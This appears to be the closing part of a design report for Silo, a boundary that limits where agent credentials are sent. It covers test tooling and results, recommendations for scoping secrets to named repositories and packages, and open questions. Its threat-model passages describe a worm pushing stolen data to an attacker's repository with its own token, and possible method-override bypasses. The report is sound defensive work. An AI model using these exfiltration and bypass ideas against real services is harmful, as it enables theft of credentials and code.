| `test_classify.py` | `python3 -m unittest test_classify -v` | 35 tests, about 130 assertions, pass. They cover every case on this page, with real packs made by `git pack-objects` |
| `openapi_sweep.py` | `python3 openapi_sweep.py` | one request per REST operation, decided; `results/openapi-sweep.txt` |
| `record_proxy.py`, `run_corpus.sh` | `bash run_corpus.sh OUT` | a proxy that ends TLS with its own CA, records every request and answers from fakes (Git through the local `git http-backend`), never the internet. 33 commands, 52 requests, in `corpus/` |
| `classify_corpus.py` | `python3 classify_corpus.py OUT` (needs a fresh `run_corpus.sh` output, for its Git state) | allow 31, hold 17, deny 4; `results/corpus-decisions.txt` |
| `thin_experiment.sh`, `pack_report.py` | `bash thin_experiment.sh SOURCE_REPO OUT` | the thin and no-thin numbers above; `results/thin-packs.txt` |

What did not work, and was not retried: 4 of the 33 commands stopped early on the fakes:
`gh release create` (the fake answered its check for an existing release with 201),
`gh release upload` (the fake's GraphQL answer had a field `gh` did not expect), `npm token create`
(it asks for a password) and `gh auth status` (it judged the made-up token invalid). The requests each sent before it stopped are in the corpus. A REST
call to create a release was added in their place. No test failed and then passed.

One thing that went wrong in the first recording run: `npm` read this machine's
`npm_config_https_proxy` setting instead of the recording proxy and sent its `PUT /victim-pkg` with a
made-up token to the real registry.npmjs.org, which answered 404. No real credential was involved.
`run_corpus.sh` now starts every client from an empty environment, and the second run's corpus shows
the npm requests reaching the recording proxy.

## Recommendations

1. **`secret-limits`: add places, and answer its "to find out".** Sentences to add to the answer:
   "A secret can also be limited to named places on its hosts, such as repositories on GitHub,
   packages on npm and PyPI, or buckets on S3. The boundary reads the place and the effect of each
   request from the request itself and from a description of the host's API that ships with Silo as
   data. A request that changes something outside the named places is denied. One that creates a
   place, changes who can read one, makes code run on the host or deletes something is held, and so
   is one the description does not cover. The hosts described first are GitHub, npm, PyPI and S3."
   And change "only read" to: "requests that the host's description files as reads, such as a Git
   fetch or a GitHub GraphQL request whose every operation is a query".
2. **`limits-on-a-secret`**: its `what` says a read-only secret "is sent only with GET requests",
   which is narrower than the answer of `secret-limits` it rests on (GET, HEAD and listed reads), and
   its notes then count GraphQL reads as a cost. Replace with "is sent only with requests that read",
   and add "and to named places".
3. **New decision, `boundary`: "Can a program send its own credential to a host that gets a
   secret?"** Answer: "No. On a host that gets a secret, a request that carries a credential other
   than a placeholder, in an Authorization or Cookie header or a token in the query, is denied. A rule
   can ask the same of any allowed host, and the boundary then ends the encrypted connection to it."
   Case: s1ngularity's loot pushed to the attacker's repository with the attacker's own token. Whether
   it is on by default for github.com when no secret is given is the choice to put to polarzero.
4. **New decision, `boundary` or `rules`: "Where does Silo learn what a request does at a host?"**
   Answer: "From a description of the host's API that ships with Silo as data, one file per host,
   built from the host's own published description where there is one. A test refuses a file that
   files a write as a read when the host's own description marks it as a write. A request the file
   does not cover is unknown." It is to hosts what `ecosystem-data` is to package ecosystems.
5. **`merges-and-deploys-held`**: replace "to find out" with the list in "How it fits the plan".
6. **`asking-each-use`**: let the ask be set on an effect of a secret, not only on the secret: "ask
   each time this secret publishes". The publish of `npm-publish` in its own example is then exact,
   and the rest of that secret's use asks nothing.
7. **`what-an-ask-shows`**: add to its notes that for a described host, the ask names the effect and
   the place: "create a public repository victim/loot", "push to polarzero/silo, branch agent/fix,
   changing .github/workflows/ci.yml".
8. **A trial, not a promise: reading pushes.** The boundary adds `no-thin` to GitHub's receive-pack
   advertisement, parses the pack, and reads the tree before the push from GitHub. Measured here on
   real pushes. To try at scale before it is promised: a monorepo push of thousands of objects, and
   the time a lookup adds.
9. **`worst-case-and-rule-sets`**: a limit to named repositories states, when it is set, which named
   repositories are public and which workflows run on push there.

## Open questions

- Whether GitHub honours `X-HTTP-Method-Override` or `_method`. Held either way.
- The exact router GitHub uses when a literal path and a parameter path both match
  (`POST /orgs/{org}/attestations/bulk-list`). Held either way.
- How large a no-thin pack gets on a big push, and whether some Git clients ignore `no-thin`.
- AWS signing at the boundary: what the plan's `secret-placeholder` "to find out" for keys that sign
  requests becomes. The S3 part waits on it.
- Codex cloud's GitHub token scope: the sources found are third-party.
- Whether the record keeps GitHub's lookup answers as facts of their own, or only beside the
  decision. They are needed to replay a decision.

## Decisions challenged

- **`ending-the-encrypted-connection`**, "Every other connection passes encrypted and unread". Case:
  github.com is allowed for cloning public repositories and no GitHub secret is given. A worm pushes
  the loot with its own token to its own repository. The boundary cannot see the credential, so no
  rule can refuse it. Proposed: a host allowed by a rule that asks for it, and every host that gets
  a secret, is read, and refuses credentials that are not Silo's (recommendation 3).
- **`limits-on-a-secret`**, "sent only with GET requests". It contradicts `secret-limits`, which is
  answered and which it needs. See recommendation 2.
